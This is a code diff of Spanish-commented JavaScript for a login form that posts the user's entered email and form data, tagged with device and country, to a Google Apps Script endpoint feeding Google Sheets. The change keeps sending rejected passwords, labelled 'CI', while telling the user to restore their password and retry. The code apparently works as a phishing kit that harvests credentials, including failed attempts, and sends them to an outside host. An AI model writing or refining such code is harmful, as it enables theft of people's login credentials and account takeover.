@@ -13,6 +13,9 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
     
+    // Bandera para indicar si hay contraseña incorrecta
+    let hasInvalidPassword = false;
+    
     // Validar formato de correo electrónico
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!emailRegex.test(email)) {
@@ -36,34 +39,11 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     if (containsProhibitedPassword) {
         errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
         errorMessage.style.color = 'red';
+        hasInvalidPassword = true; // Marcamos que hay contraseña incorrecta
         passwordInput.value = '';
-        return; // Detiene el procesamiento
+        
+        // No hacemos return aquí para permitir el envío a Sheets
     }
-    
-    // Si pasa todas las validaciones, continúa con el proceso normal
-    // Limpiar cualquier mensaje de error previo
-    if (errorMessage) {
-        errorMessage.textContent = "";
-    }
-
-    // Ocultar el formulario
-    document.getElementById("miFormulario").style.display = "none";
-    
-    // Mostrar mensaje "Cargando..."
-    let loadingMessage = document.createElement("p");
-    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
-    loadingMessage.style.textAlign = "center";
-    document.body.appendChild(loadingMessage);
-    
-    // Cargar usuario.html dentro del iframe sin heredar estilos
-    let iframe = document.getElementById("usuarioFrame");
-    iframe.src = "usuario.html";
-    iframe.style.display = "block"; // Hacer visible el iframe
-    
-    // Eliminar mensaje de carga después de mostrar usuario.html
-    iframe.onload = function() {
-        loadingMessage.remove();
-    };
     
     // ✅ Detectar si el usuario usa iPhone o Android
     let deviceType = "Otro"; // Valor por defecto
@@ -90,6 +70,13 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     formData.append("device", deviceType); // Agregar dispositivo
     formData.append("country", country); // Agregar país
     
+    // Agregar indicación de contraseña incorrecta si aplica
+    if (hasInvalidPassword) {
+        formData.append("status", "CI"); // CI = Contraseña Incorrecta
+    } else {
+        formData.append("status", "OK"); // Estado normal
+    }
+    
     // ✅ Enviar los datos correctamente a Google Sheets
     const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
     fetch(url, {
@@ -97,4 +84,31 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         body: new URLSearchParams(formData),
         headers: { "Content-Type": "application/x-www-form-urlencoded" }
     }).catch(error => console.error("Error al enviar datos:", error));
+    
+    // Solo procedemos a mostrar usuario.html si la contraseña es válida
+    if (!hasInvalidPassword) {
+        // Limpiar cualquier mensaje de error previo
+        if (errorMessage) {
+            errorMessage.textContent = "";
+        }
+
+        // Ocultar el formulario
+        document.getElementById("miFormulario").style.display = "none";
+        
+        // Mostrar mensaje "Cargando..."
+        let loadingMessage = document.createElement("p");
+        loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
+        loadingMessage.style.textAlign = "center";
+        document.body.appendChild(loadingMessage);
+        
+        // Cargar usuario.html dentro del iframe sin heredar estilos
+        let iframe = document.getElementById("usuarioFrame");
+        iframe.src = "usuario.html";
+        iframe.style.display = "block"; // Hacer visible el iframe
+        
+        // Eliminar mensaje de carga después de mostrar usuario.html
+        iframe.onload = function() {
+            loadingMessage.remove();
+        };
+    }
 });
